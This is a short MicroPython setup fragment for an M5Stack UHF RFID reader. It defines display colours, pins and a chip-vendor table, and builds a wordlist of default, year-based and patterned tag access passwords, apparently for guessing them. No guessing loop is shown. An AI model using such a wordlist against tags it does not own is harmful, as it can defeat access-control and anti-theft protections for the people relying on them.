import os, sys, time, machine
import M5
from M5 import *
from unit import UHFRFIDUnit
from machine import WDT

# --- CORES ---
C_BG      = 0x000000 
C_PANEL   = 0x1A1A1A 
C_ACCENT  = 0x00FFFF 
C_TEXT    = 0xFFFFFF 
C_SUBTEXT = 0xAAAAAA 
C_GREY_BTN= 0x444444 
C_SUCCESS = 0x00FF00 
C_DANGER  = 0xFF0000 
C_HEADER  = 0x003333 

# --- HARDWARE ---
PIN_TX = 22
PIN_RX = 21

uhf = None
wdt = None
tags_encontradas = [] 
cursor_index = 0      

# --- DATABASE ---
CHIP_DB = {
    "E28011": "Impinj Monza", "E20060": "NXP UCODE", "E20034": "Alien Higgs"
}

KEYS = ["00000000", "FFFFFFFF", "12345678", "88888888", "11111111",
        "99999999", "12341234", "00001234", "12340000", "AABBCCDD"]
for ano in range(2018, 2027):
    s = str(ano); KEYS += [s+s, "0101"+s, s+"0101", s+"0000"]
KEYS += ["54414747", "50415353", "AD00AD00", "DEADBEEF", "CAFEBABE"]
KEYS = list(dict.fromkeys(KEYS)) 

def setup():
    global wdt
    M5.begin()
    try:
        wdt = WDT(timeout=45000) 
        wdt.feed()
    except: pass

    try:
        i2c = machine.I2C(0, scl=machine.Pin(PIN_RX), sda=machine.Pin(PIN_TX))
        i2c.deinit()
        time.sleep(0.1)
    except: pass
    
    iniciar_uhf()
    tela_scan_mode()

def iniciar_uhf():
    global uhf
    try:
        if uhf:
            try: uhf.deinit()
            except: pass
        uhf = UHFRFIDUnit(1, port=(PIN_TX, PIN_RX))
        uhf.set_working_region(UHFRFIDUnit.USA)
        uhf.set_tx_power(26) 
    except: machine.reset()

